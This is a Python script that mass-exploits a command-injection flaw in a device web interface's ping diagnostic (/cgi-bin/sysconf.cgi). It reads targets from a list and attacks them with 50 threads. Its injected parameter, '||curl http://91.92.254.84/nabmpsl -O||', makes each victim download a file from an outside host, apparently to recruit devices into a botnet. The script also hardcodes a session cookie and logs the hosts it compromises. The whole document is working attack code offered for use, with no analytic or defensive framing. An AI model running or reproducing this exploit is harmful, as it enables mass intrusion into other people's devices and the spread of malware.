import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.exceptions import Timeout

def send_request(ip_port):
    url = 'http://{}/cgi-bin/sysconf.cgi'.format(ip_port)
    params = {
        'page': 'ajax.asp',
        'action': 'ping',
        'url': '||curl http://91.92.254.84/nabmpsl -O||',
        'time': '1704893706372',
        '_': '1704893706373'
    }

    headers = {
        'Host': ip_port,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
        'Cookie': 'sid=GHXFBz0qMcw0; page=management_diagnostics.asp,2,3',
        'Connection': 'close'
    }

    try:
        response = requests.get(url, params=params, headers=headers, timeout=15)  # Set timeout value as needed

        if response.status_code == 200:
            print("[CHINA] found: {} - {}".format(ip_port, response.status_code))
    except Timeout:
        pass  # Suppress the printing of timeout errors

def main():
    with open('ips.txt', 'r') as file:
        ip_ports = [line.strip() for line in file]

    with ThreadPoolExecutor(max_workers=50) as executor:  # Set max_workers as needed
        futures = [executor.submit(send_request, ip_port) for ip_port in ip_ports]

        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print("Error: {}".format(e))

if __name__ == "__main__":
    main()
